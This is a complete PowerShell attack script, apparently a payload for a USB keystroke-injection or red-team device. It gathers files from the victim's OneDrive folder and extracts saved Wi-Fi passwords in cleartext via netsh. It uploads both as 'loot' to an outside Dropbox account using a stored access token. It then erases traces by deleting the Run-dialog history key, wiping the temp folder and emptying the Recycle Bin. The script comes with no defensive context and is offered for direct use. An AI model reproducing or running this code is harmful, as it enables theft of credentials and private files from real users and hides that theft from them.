# Create Upload-DropBox function
function Upload-DropBox() {
    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [string]$SourceFilePath
    ) 
    $accessToken = Get-Content -Path $env:TEMP\at.txt
    $outputFile = Split-Path $SourceFilePath -leaf
    $targetFilePath = "/$outputFile"
    $arg = '{ "path": "' + $targetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
    $authorization = "Bearer " + $accessToken
    $authHeaders = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
    $authHeaders.Add("Authorization", $authorization)
    $authHeaders.Add("Dropbox-API-Arg", $arg)
    $authHeaders.Add("Content-Type", 'application/octet-stream')
    Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $authHeaders
}
# Create Get-WifiProfiles function
function Get-WifiProfiles() {
    # Create empty array	
    $wifiProfileNames = @()
    $netshOutput = netsh.exe wlan show profiles | Select-String -Pattern " : "
    foreach ($wifiProfileName in $netshOutput){
        $wifiProfileNames += (($wifiProfileName -split ":")[1]).Trim()
    }
    $wifiProfileObjects =@()
    #Bind the WLAN profile names and also the password to a custom object
    foreach ($wifiProfileName in $wifiProfileNames){
        #get the output for the specified profile name and trim the output to receive the password if there is no password it will inform the user
        try {
            $wifiProfilePassword = (((netsh.exe wlan show profiles name="$wifiProfileName" key=clear | select-string -Pattern "Key Content") -split ":")[1]).Trim()
        }
        Catch {
            $wifiProfilePassword = "The password is not stored in this profile"
        }
        #Build the object and add this to an array
        $wifiProfileObject = New-Object PSCustomobject 
        $wifiProfileObject | Add-Member -Type NoteProperty -Name "ProfileName" -Value $wifiProfileName
        $wifiProfileObject | Add-Member -Type NoteProperty -Name "ProfilePassword" -Value $wifiProfilePassword
        $wifiProfileObjects += $wifiProfileObject
    }
    Write-Output $wifiProfileObjects
}
# Variables
$computerName = $env:COMPUTERNAME
$OneDriveLoot = "$env:TEMP\imabdk-loot-OneDrive-$computerName.zip"
$wifiProfilesLoot = "$env:TEMP\imabdk-loot-WiFiProfiles-$computerName.txt"

# Exfiltrate OneDrive if such is being used
if (Test-Path $env:OneDrive) {
    $getLoot = Get-ChildItem -Path $env:OneDrive -Recurse -Include *.docx,*.pptx,*.jpg | Select-Object -First 10
    $getLoot | Compress-Archive -DestinationPath $OneDriveLoot -Update
}

Get-WifiProfiles | Out-File $wifiProfilesLoot

# Upload to Dropbox
if ((Test-Path $OneDriveLoot) -OR (Test-Path $wifiProfilesLoot)) {
    Upload-DropBox -SourceFilePath $OneDriveLoot
    Upload-DropBox -SourceFilePath $wifiProfilesLoot
}

# Cleanup after script
Remove-Item -Path "HKCU:\SOftware\Microsoft\Windows\CurrentVErsion\Explorer\RunMRU" -Force
Remove-Item -Path "$env:TEMP\*" -Force -Recurse -ErrorAction SilentlyContinue
Clear-RecycleBin -Force -ErrorAction SilentlyContinue
